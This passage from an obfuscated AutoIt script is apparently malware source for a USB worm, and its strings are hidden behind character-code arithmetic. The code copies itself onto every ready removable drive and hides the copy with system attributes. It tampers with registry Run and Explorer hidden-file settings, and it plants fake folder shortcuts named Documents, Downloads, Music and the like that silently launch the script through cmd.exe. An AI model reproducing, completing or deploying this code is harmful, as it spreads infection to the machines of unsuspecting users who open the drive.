String(\"c\") &amp; ChrW(24 + 90) &amp; ChrW(39 + 72) &amp; \"s\" &amp; ChrW(49 + 62) &amp; ChrW(102) &amp; ChrW(125 - 9) &amp; ChrW(141 - 49) &amp; ChrW(87) &amp; ChrW(109 - 4) &amp; ChrW(110) &amp; ChrW(32 + 68) &amp; String(\"o\") &amp; String(\"w\") &amp; ChrW(150 - 35) &amp; \"\\\" &amp; \"C\" &amp; ChrW(47 + 70) &amp; \"r\" &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; ChrW(157 - 41) &amp; ChrW(86) &amp; ChrW(101) &amp; ChrW(42 + 72) &amp; ChrW(122 - 7) &amp; String(\"i\") &amp; \"o\" &amp; \"n\" &amp; ChrW(31 + 61) &amp; \"R\" &amp; ChrW(117) &amp; ChrW(110), ChrW(32 + 39) &amp; ChrW(26 + 85) &amp; ChrW(156 - 45) &amp; ChrW(3 + 100) &amp; String(\"l\") &amp; ChrW(112 - 11) &amp; ChrW(65 - 33) &amp; \"C\" &amp; ChrW(104) &amp; ChrW(41 + 73) &amp; ChrW(111) &amp; String(\"m\") &amp; \"e\")\n    RegDelete(ChrW(112 - 40) &amp; ChrW(75) &amp; ChrW(69) &amp; ChrW(89) &amp; String(\"_\") &amp; ChrW(67) &amp; String(\"U\") &amp; ChrW(126 - 44) &amp; \"R\" &amp; ChrW(69) &amp; ChrW(110 - 32) &amp; ChrW(84) &amp; ChrW(95) &amp; ChrW(85) &amp; String(\"S\") &amp; ChrW(69) &amp; ChrW(82) &amp; ChrW(92) &amp; ChrW(83) &amp; ChrW(79) &amp; String(\"F\") &amp; ChrW(20 + 64) &amp; ChrW(87) &amp; \"A\" &amp; ChrW(82) &amp; ChrW(100 - 31) &amp; ChrW(49 + 43) &amp; ChrW(77) &amp; ChrW(105) &amp; String(\"c\") &amp; String(\"r\") &amp; String(\"o\") &amp; ChrW(151 - 36) &amp; ChrW(122 - 11) &amp; ChrW(102) &amp; ChrW(116) &amp; ChrW(25 + 67) &amp; ChrW(136 - 49) &amp; \"i\" &amp; ChrW(15 + 95) &amp; ChrW(100) &amp; ChrW(50 + 61) &amp; ChrW(136 - 17) &amp; ChrW(115) &amp; String(\"\\\") &amp; \"C\" &amp; String(\"u\") &amp; String(\"r\") &amp; ChrW(33 + 81) &amp; ChrW(109 - 8) &amp; ChrW(110) &amp; ChrW(116) &amp; String(\"V\") &amp; \"e\" &amp; String(\"r\") &amp; \"s\" &amp; \"i\" &amp; String(\"o\") &amp; ChrW(128 - 18) &amp; String(\"\\\") &amp; ChrW(82) &amp; ChrW(117) &amp; ChrW(35 + 75), ChrW(32 + 39) &amp; ChrW(26 + 85) &amp; ChrW(156 - 45) &amp; ChrW(3 + 100) &amp; String(\"l\") &amp; ChrW(112 - 11) &amp; ChrW(65 - 33) &amp; \"C\" &amp; ChrW(104) &amp; ChrW(41 + 73) &amp; ChrW(111) &amp; String(\"m\") &amp; \"e\")\nEndFunc\n\nFunc lfvcwvjzbaxkwdlqvabiwzwzssazyiijcolgfponslgyfebnachv()\n    $bxvzptvekotymtlyxntxtbcefldighqwiesmnwdymikldlavjufm = $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan &amp; ChrW(92) &amp; ChrW(105 - 28) &amp; ChrW(118 - 13) &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(122 - 7) &amp; \"o\" &amp; \"f\" &amp; ChrW(116) &amp; ChrW(83) &amp; String(\"e\") &amp; ChrW(131 - 32) &amp; String(\"u\") &amp; \"r\" &amp; ChrW(30 + 75) &amp; ChrW(40 + 76) &amp; ChrW(121) &amp; String(ChrW(47 + -1)) &amp; ChrW(127 - 26) &amp; \"x\" &amp; ChrW(133 - 32) &amp; ChrW(37 - 5) &amp; String(\" \") &amp; ChrW(50 - 3) &amp; \"A\" &amp; ChrW(117) &amp; \"t\" &amp; ChrW(111) &amp; ChrW(73) &amp; ChrW(116) &amp; \"3\" &amp; \"E\" &amp; String(\"x\") &amp; \"e\" &amp; ChrW(18 + 81) &amp; String(\"u\") &amp; ChrW(9 + 107) &amp; String(\"e\") &amp; ChrW(116 - 33) &amp; String(\"c\") &amp; String(\"r\") &amp; \"i\" &amp; ChrW(116 - 4) &amp; ChrW(164 - 48) &amp; ChrW(6 + 26) &amp; ChrW(32) &amp; ChrW(54 - 8) &amp; ChrW(91 - 45) &amp; ChrW(103 - 11) &amp; $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan &amp; String(\"\\\") &amp; $ivfnryrxlmwhjvjiruxaaxafykecdkqygsyawqyvstbsozrqazjk\n    $frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj = DriveGetDrive(ChrW(107 - 25) &amp; String(\"E\") &amp; ChrW(40 + 37) &amp; ChrW(79) &amp; ChrW(86) &amp; ChrW(74 - 9) &amp; ChrW(8 + 58) &amp; ChrW(76) &amp; ChrW(70 - 1))\n    For $kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw = 1 To UBound($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj) - 1\n        If DriveStatus($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw]) = ChrW(41 + 41) &amp; ChrW(69) &amp; \"A\" &amp; String(\"D\") &amp; String(\"Y\") Then\n            If DriveSpaceFree($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw]) &gt; 1024 Then\n                DirCopy(@ScriptDir, $frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; String(\"\\\") &amp; $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan, 1)\n                FileSetAttrib($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; String(\"\\\") &amp; $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan, ChrW(43) &amp; ChrW(111 - 29) &amp; ChrW(83) &amp; ChrW(13 + 59))\n                FileCreateShortcut(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", $frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; ChrW(92) &amp; ChrW(18 + 50) &amp; \"o\" &amp; ChrW(99) &amp; ChrW(144 - 27) &amp; ChrW(18 + 91) &amp; String(\"e\") &amp; \"n\" &amp; \"t\" &amp; ChrW(157 - 42), \"\", String(\"/\") &amp; ChrW(147 - 48) &amp; ChrW(74 - 42) &amp; ChrW(19 + 96) &amp; ChrW(12 + 104) &amp; ChrW(19 + 78) &amp; String(\"r\") &amp; String(\"t\") &amp; ChrW(21 + 11) &amp; $bxvzptvekotymtlyxntxtbcefldighqwiesmnwdymikldlavjufm &amp; ' explorer  ChrW(73-36) &amp; ChrW(31+36) &amp; String( \"D\" ) &amp; String(\"%\")  &amp; exit', \"\", String(\"%\") &amp; ChrW(9 + 110) &amp; ChrW(10 + 95) &amp; ChrW(138 - 28) &amp; String(\"d\") &amp; \"i\" &amp; String(\"r\") &amp; \"%\" &amp; ChrW(12 + 80) &amp; ChrW(40 + 75) &amp; \"y\" &amp; \"s\" &amp; ChrW(143 - 27) &amp; \"e\" &amp; ChrW(109) &amp; \"3\" &amp; String(\"2\") &amp; ChrW(35 + 57) &amp; \"S\" &amp; ChrW(72) &amp; ChrW(31 + 38) &amp; String(\"L\") &amp; String(\"L\") &amp; ChrW(28 + 23) &amp; ChrW(16 + 34) &amp; ChrW(47 + -1) &amp; String(\"d\") &amp; String(\"l\") &amp; \"l\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                FileCreateShortcut(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", $frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; ChrW(46 + 46) &amp; \"D\" &amp; ChrW(133 - 22) &amp; String(\"w\") &amp; ChrW(152 - 42) &amp; ChrW(133 - 25) &amp; \"o\" &amp; String(\"a\") &amp; String(\"d\") &amp; \"s\", \"\", String(\"/\") &amp; ChrW(147 - 48) &amp; ChrW(74 - 42) &amp; ChrW(19 + 96) &amp; ChrW(12 + 104) &amp; ChrW(19 + 78) &amp; String(\"r\") &amp; String(\"t\") &amp; ChrW(21 + 11) &amp; $bxvzptvekotymtlyxntxtbcefldighqwiesmnwdymikldlavjufm &amp; ' explorer  ChrW(73-36) &amp; ChrW(31+36) &amp; String( \"D\" ) &amp; String(\"%\")  &amp; exit', \"\", String(\"%\") &amp; ChrW(9 + 110) &amp; ChrW(10 + 95) &amp; ChrW(138 - 28) &amp; String(\"d\") &amp; \"i\" &amp; String(\"r\") &amp; \"%\" &amp; ChrW(12 + 80) &amp; ChrW(40 + 75) &amp; \"y\" &amp; \"s\" &amp; ChrW(143 - 27) &amp; \"e\" &amp; ChrW(109) &amp; \"3\" &amp; String(\"2\") &amp; ChrW(35 + 57) &amp; \"S\" &amp; ChrW(72) &amp; ChrW(31 + 38) &amp; String(\"L\") &amp; String(\"L\") &amp; ChrW(28 + 23) &amp; ChrW(16 + 34) &amp; ChrW(47 + -1) &amp; String(\"d\") &amp; String(\"l\") &amp; \"l\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                If FileExists($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; ChrW(141 - 49) &amp; ChrW(82) &amp; ChrW(29 + 72) &amp; ChrW(112) &amp; ChrW(111) &amp; \"r\" &amp; ChrW(144 - 28) &amp; ChrW(115)) = False Then\n                    DirCreate($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; ChrW(141 - 49) &amp; ChrW(82) &amp; ChrW(29 + 72) &amp; ChrW(112) &amp; ChrW(111) &amp; \"r\" &amp; ChrW(144 - 28) &amp; ChrW(115))\n                EndIf\n                If FileExists($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; ChrW(92) &amp; ChrW(83) &amp; ChrW(21 + 95) &amp; \"a\" &amp; ChrW(116) &amp; String(\"m\") &amp; ChrW(145 - 44) &amp; \"n\" &amp; ChrW(157 - 41) &amp; ChrW(139 - 24)) = False Then\n                    DirCreate($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; ChrW(92) &amp; ChrW(83) &amp; ChrW(21 + 95) &amp; \"a\" &amp; ChrW(116) &amp; String(\"m\") &amp; ChrW(145 - 44) &amp; \"n\" &amp; ChrW(157 - 41) &amp; ChrW(139 - 24))\n                EndIf\n                If @error Then\n                EndIf\n                If FileExists($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; ChrW(92) &amp; ChrW(77) &amp; ChrW(18 + 103) &amp; ChrW(32) &amp; ChrW(84 - 4) &amp; ChrW(105) &amp; String(\"c\") &amp; ChrW(22 + 94) &amp; ChrW(8 + 109) &amp; ChrW(132 - 18) &amp; ChrW(101) &amp; ChrW(142 - 27)) = False Then\n                    DirCreate($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; ChrW(92) &amp; ChrW(77) &amp; ChrW(18 + 103) &amp; ChrW(32) &amp; ChrW(84 - 4) &amp; ChrW(105) &amp; String(\"c\") &amp; ChrW(22 + 94) &amp; ChrW(8 + 109) &amp; ChrW(132 - 18) &amp; ChrW(101) &amp; ChrW(142 - 27))\n                EndIf\n                If @error Then\n                EndIf\n                If FileExists($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; String(\"\\\") &amp; String(\"M\") &amp; ChrW(6 + 115) &amp; ChrW(32) &amp; ChrW(86) &amp; \"i\" &amp; ChrW(100) &amp; String(\"e\") &amp; ChrW(11 + 100) &amp; ChrW(115)) = False Then\n                    DirCreate($frdaurueomydzwpiaxjajtlkrratljzlbeqrbrqvcylyjgmgvrtj[$kecmgsjdqatdnmbugyhjfoxlilaketyupobwcdlihoecegmxfraw] &amp; String(\"\\\") &amp; String(\"M\") &amp; ChrW(6 + 115) &amp; ChrW(32) &amp; ChrW(86) &amp; \"i\" &amp; ChrW(100) &amp; String(\"e\") &amp; ChrW(11 + 100) &amp; ChrW(115))\n                    yutherqpkizldomanazujuowkemziyaieyvuglsqadmmqsuumyvk(\"M\" &amp; ChrW(83) &amp; \"G\" &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; String(\" \") &amp; ChrW(24 + 59) &amp; ChrW(37 + 75) &amp; String(\"r\") &amp; \"e\" &amp; ChrW(137 - 40) &amp; ChrW(100) &amp; ChrW(135 - 30) &amp; \"n\" &amp; String(\"g\") &amp; String(\" \") &amp; ChrW(82 - 49) &amp; String(\"!\"))\n                EndIf\n                If @error Then\n                EndIf\n                If @error Then\n                EndIf\n                mrlkjwkdvkbssnhhsekfkmqktxuoqlzwcmwldaxjfksijngrvuuv()\n            EndIf\n        EndIf\n    Next\n    If @error Then\n    EndIf\nEndFunc\n\nFunc mrlkjwkdvkbssnhhsekfkmqktxuoqlzwcmwldaxjfksijngrvuuv($kjdvhreuszywcypzlercnycsjvgbydentbjgkfpkzqqiphygrnlb = \"REMOVABLE\")\n    $zxklhllljcuotldbphofohbwitcbwakmrcowpxzyuezxwboceyqi = $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan &amp; ChrW(92) &amp; ChrW(105 - 28) &amp; ChrW(118 - 13) &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(122 - 7) &amp; \"o\" &amp; \"f\" &amp; ChrW(116) &amp; ChrW(83) &amp; String(\"e\") &amp; ChrW(131 - 32) &amp; String(\"u\") &amp; \"r\" &amp; ChrW(30 + 75) &amp; ChrW(40 + 76) &amp; ChrW(121) &amp; String(ChrW(47 + -1)) &amp; ChrW(127 - 26) &amp; \"x\" &amp; ChrW(133 - 32) &amp; ChrW(37 - 5) &amp; String(\" \") &amp; ChrW(50 - 3) &amp; \"A\" &amp; ChrW(117) &amp; \"t\" &amp; ChrW(111) &amp; ChrW(73) &amp; ChrW(116) &amp; \"3\" &amp; \"E\" &amp; String(\"x\") &amp; \"e\" &amp; ChrW(18 + 81) &amp; String(\"u\") &amp; ChrW(9 + 107) &amp; String(\"e\") &amp; ChrW(116 - 33) &amp; String(\"c\") &amp; String(\"r\") &amp; \"i\" &amp; ChrW(116 - 4) &amp; ChrW(164 - 48) &amp; ChrW(6 + 26) &amp; ChrW(32) &amp; ChrW(54 - 8) &amp; ChrW(91 - 45) &amp; ChrW(103 - 11) &amp; $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan &amp; String(\"\\\") &amp; $ivfnryrxlmwhjvjiruxaaxafykecdkqygsyawqyvstbsozrqazjk\n    RegWrite(ChrW(36 + 36) &amp; ChrW(75) &amp; ChrW(102 - 33) &amp; String(\"Y\") &amp; String(\"_\") &amp; ChrW(40 + 27) &amp; ChrW(129 - 44) &amp; ChrW(93 - 11) &amp; ChrW(82) &amp; ChrW(82 - 13) &amp; String(\"N\") &amp; \"T\" &amp; ChrW(95) &amp; ChrW(85) &amp; ChrW(14 + 69) &amp; ChrW(69) &amp; String(\"R\") &amp; String(\"\\\") &amp; ChrW(83) &amp; ChrW(161 - 50) &amp; ChrW(7 + 95) &amp; \"t\" &amp; \"w\" &amp; \"a\" &amp; ChrW(114) &amp; \"e\" &amp; String(\"\\\") &amp; ChrW(127 - 50) &amp; ChrW(108 - 3) &amp; ChrW(146 - 47) &amp; ChrW(160 - 46) &amp; String(\"o\") &amp; ChrW(163 - 48) &amp; ChrW(21 + 90) &amp; ChrW(107 - 5) &amp; String(\"t\") &amp; ChrW(92) &amp; ChrW(101 - 14) &amp; String(\"i\") &amp; ChrW(145 - 35) &amp; ChrW(100) &amp; String(\"o\") &amp; \"w\" &amp; String(\"s\") &amp; ChrW(12 + 80) &amp; ChrW(67) &amp; ChrW(152 - 35) &amp; String(\"r\") &amp; ChrW(114) &amp; ChrW(8 + 93) &amp; ChrW(141 - 31) &amp; ChrW(159 - 43) &amp; ChrW(116 - 30) &amp; ChrW(22 + 79) &amp; String(\"r\") &amp; ChrW(152 - 37) &amp; String(\"i\") &amp; \"o\" &amp; ChrW(39 + 71) &amp; ChrW(92) &amp; ChrW(83 - 14) &amp; ChrW(120) &amp; \"p\" &amp; ChrW(108) &amp; ChrW(50 + 61) &amp; ChrW(12 + 102) &amp; ChrW(26 + 75) &amp; ChrW(114) &amp; ChrW(118 - 26) &amp; ChrW(65) &amp; String(\"d\") &amp; ChrW(118) &amp; ChrW(111 - 14) &amp; ChrW(31 + 79) &amp; ChrW(50 + 49) &amp; \"e\" &amp; String(\"d\"), ChrW(25 + 58) &amp; ChrW(123 - 19) &amp; ChrW(114 - 3) &amp; ChrW(136 - 17) &amp; ChrW(83) &amp; \"u\" &amp; String(\"p\") &amp; \"e\" &amp; ChrW(4 + 110) &amp; ChrW(72) &amp; ChrW(140 - 35) &amp; String(\"d\") &amp; ChrW(100) &amp; String(\"e\") &amp; ChrW(27 + 83), ChrW(82) &amp; ChrW(69) &amp; ChrW(71) &amp; ChrW(16 + 79) &amp; ChrW(110 - 42) &amp; ChrW(87) &amp; \"O\" &amp; \"R\" &amp; ChrW(68), 0)\n    $ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy = DriveGetDrive($kjdvhreuszywcypzlercnycsjvgbydentbjgkfpkzqqiphygrnlb)\n    If IsArray($ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy) Then\n        For $nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus = 1 To $ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[0]\n            If DriveStatus($ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus]) = ChrW(41 + 41) &amp; ChrW(69) &amp; \"A\" &amp; String(\"D\") &amp; String(\"Y\") Then\n                If DriveSpaceFree($ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus]) &gt; 10 Then\n                    If FileExists($ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus] &amp; String(\"\\\") &amp; $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan) = 0 Then FileDelete($ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus] &amp; String(\"\\\") &amp; $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan)\n                    DirCopy(@ScriptDir, $ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus] &amp; String(\"\\\") &amp; $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan, 1)\n                    FileSetAttrib($ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus] &amp; String(\"\\\") &amp; $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan, ChrW(43) &amp; ChrW(111 - 29) &amp; ChrW(83) &amp; ChrW(13 + 59))\n                    Local $vgtgbbjtisqctyomhqmnunnssxtqbwdiqjnmfdibwweuwmgfskqy = FileFindFirstFile($ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus] &amp; ChrW(36 + 56) &amp; ChrW(3 + 39) &amp; ChrW(47 + -1) &amp; ChrW(42))\n                    While 1\n                        Dim $ehyisaneisrmohkjldieikqxitvfqoysgfeklfuepdsefsfobxtn = FileFindNextFile($vgtgbbjtisqctyomhqmnunnssxtqbwdiqjnmfdibwweuwmgfskqy)\n                        If $ehyisaneisrmohkjldieikqxitvfqoysgfeklfuepdsefsfobxtn = \"\" Then ExitLoop\n                        If StringInStr(FileGetAttrib($ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus] &amp; String(\"\\\") &amp; $ehyisaneisrmohkjldieikqxitvfqoysgfeklfuepdsefsfobxtn), \"D\") AND ($ehyisaneisrmohkjldieikqxitvfqoysgfeklfuepdsefsfobxtn &lt;&gt; ChrW(47 + -1) OR $ehyisaneisrmohkjldieikqxitvfqoysgfeklfuepdsefsfobxtn &lt;&gt; ChrW(46) &amp; ChrW(46)) Then\n                            FileCreateShortcut(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", $ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus] &amp; String(\"\\\") &amp; $ehyisaneisrmohkjldieikqxitvfqoysgfeklfuepdsefsfobxtn &amp; String(\"\\\") &amp; $ehyisaneisrmohkjldieikqxitvfqoysgfeklfuepdsefsfobxtn, \"\", ChrW(33 + 14) &amp; ChrW(16 + 83) &amp; ChrW(32) &amp; ChrW(12 + 103) &amp; String(\"t\") &amp; ChrW(39 + 58) &amp; ChrW(147 - 33) &amp; ChrW(31 + 85) &amp; ChrW(32) &amp; ChrW(46) &amp; \".\" &amp; \"\\\" &amp; $zxklhllljcuotldbphofohbwitcbwakmrcowpxzyuezxwboceyqi &amp; ' explorer  ChrW(73-36) &amp; ChrW(31+36) &amp; String( \"D\" ) &amp; String(\"%\")  &amp; exit', \"\", String(\"%\") &amp; ChrW(9 + 110) &amp; ChrW(10 + 95) &amp; ChrW(138 - 28) &amp; String(\"d\") &amp; \"i\" &amp; String(\"r\") &amp; \"%\" &amp; ChrW(12 + 80) &amp; ChrW(40 + 75) &amp; \"y\" &amp; \"s\" &amp; ChrW(143 - 27) &amp; \"e\" &amp; ChrW(109) &amp; \"3\" &amp; String(\"2\") &amp; ChrW(35 + 57) &amp; \"S\" &amp; ChrW(72) &amp; ChrW(31 + 38) &amp; String(\"L\") &amp; String(\"L\") &amp; ChrW(28 + 23) &amp; ChrW(16 + 34) &amp; ChrW(47 + -1) &amp; String(\"d\") &amp; String(\"l\") &amp; \"l\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", $ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus] &amp; String(\"\\\") &amp; $ehyisaneisrmohkjldieikqxitvfqoysgfeklfuepdsefsfobxtn &amp; String(\"\\\") &amp; \"M\" &amp; String(\"u\") &amp; ChrW(157 - 42) &amp; ChrW(105) &amp; \"c\", \"\", ChrW(33 + 14) &amp; ChrW(16 + 83) &amp; ChrW(32) &amp; ChrW(12 + 103) &amp; String(\"t\") &amp; ChrW(39 + 58) &amp; ChrW(147 - 33) &amp; ChrW(31 + 85) &amp; ChrW(32) &amp; ChrW(46) &amp; \".\" &amp; \"\\\" &amp; $zxklhllljcuotldbphofohbwitcbwakmrcowpxzyuezxwboceyqi &amp; ' explorer  ChrW(73-36) &amp; ChrW(31+36) &amp; String( \"D\" ) &amp; String(\"%\")  &amp; exit', \"\", String(\"%\") &amp; ChrW(9 + 110) &amp; ChrW(10 + 95) &amp; ChrW(138 - 28) &amp; String(\"d\") &amp; \"i\" &amp; String(\"r\") &amp; \"%\" &amp; ChrW(12 + 80) &amp; ChrW(40 + 75) &amp; \"y\" &amp; \"s\" &amp; ChrW(143 - 27) &amp; \"e\" &amp; ChrW(109) &amp; \"3\" &amp; String(\"2\") &amp; ChrW(35 + 57) &amp; \"S\" &amp; ChrW(72) &amp; ChrW(31 + 38) &amp; String(\"L\") &amp; String(\"L\") &amp; ChrW(28 + 23) &amp; ChrW(16 + 34) &amp; ChrW(47 + -1) &amp; String(\"d\") &amp; String(\"l\") &amp; \"l\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", $ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus] &amp; String(\"\\\") &amp; $ehyisaneisrmohkjldieikqxitvfqoysgfeklfuepdsefsfobxtn &amp; String(\"\\\") &amp; String(\"P\") &amp; ChrW(139 - 34) &amp; ChrW(42 + 57) &amp; String(\"t\") &amp; ChrW(124 - 7) &amp; ChrW(4 + 110) &amp; String(\"e\") &amp; ChrW(48 + 67), \"\", ChrW(33 + 14) &amp; ChrW(16 + 83) &amp; ChrW(32) &amp; ChrW(12 + 103) &amp; String(\"t\") &amp; ChrW(39 + 58) &amp; ChrW(147 - 33) &amp; ChrW(31 + 85) &amp; ChrW(32) &amp; ChrW(46) &amp; \".\" &amp; \"\\\" &amp; $zxklhllljcuotldbphofohbwitcbwakmrcowpxzyuezxwboceyqi &amp; ' explorer  ChrW(73-36) &amp; ChrW(31+36) &amp; String( \"D\" ) &amp; String(\"%\")  &amp; exit', \"\", String(\"%\") &amp; ChrW(9 + 110) &amp; ChrW(10 + 95) &amp; ChrW(138 - 28) &amp; String(\"d\") &amp; \"i\" &amp; String(\"r\") &amp; \"%\" &amp; ChrW(12 + 80) &amp; ChrW(40 + 75) &amp; \"y\" &amp; \"s\" &amp; ChrW(143 - 27) &amp; \"e\" &amp; ChrW(109) &amp; \"3\" &amp; String(\"2\") &amp; ChrW(35 + 57) &amp; \"S\" &amp; ChrW(72) &amp; ChrW(31 + 38) &amp; String(\"L\") &amp; String(\"L\") &amp; ChrW(28 + 23) &amp; ChrW(16 + 34) &amp; ChrW(47 + -1) &amp; String(\"d\") &amp; String(\"l\") &amp; \"l\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", $ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus] &amp; String(\"\\\") &amp; $ehyisaneisrmohkjldieikqxitvfqoysgfeklfuepdsefsfobxtn &amp; String(\"\\\") &amp; \"R\" &amp; ChrW(50 + 51) &amp; String(\"p\") &amp; ChrW(26 + 85) &amp; \"r\" &amp; ChrW(9 + 107) &amp; ChrW(25 + 90), \"\", ChrW(33 + 14) &amp; ChrW(16 + 83) &amp; ChrW(32) &amp; ChrW(12 + 103) &amp; String(\"t\") &amp; ChrW(39 + 58) &amp; ChrW(147 - 33) &amp; ChrW(31 + 85) &amp; ChrW(32) &amp; ChrW(46) &amp; \".\" &amp; \"\\\" &amp; $zxklhllljcuotldbphofohbwitcbwakmrcowpxzyuezxwboceyqi &amp; ' explorer  ChrW(73-36) &amp; ChrW(31+36) &amp; String( \"D\" ) &amp; String(\"%\")  &amp; exit', \"\", String(\"%\") &amp; ChrW(9 + 110) &amp; ChrW(10 + 95) &amp; ChrW(138 - 28) &amp; String(\"d\") &amp; \"i\" &amp; String(\"r\") &amp; \"%\" &amp; ChrW(12 + 80) &amp; ChrW(40 + 75) &amp; \"y\" &amp; \"s\" &amp; ChrW(143 - 27) &amp; \"e\" &amp; ChrW(109) &amp; \"3\" &amp; String(\"2\") &amp; ChrW(35 + 57) &amp; \"S\" &amp; ChrW(72) 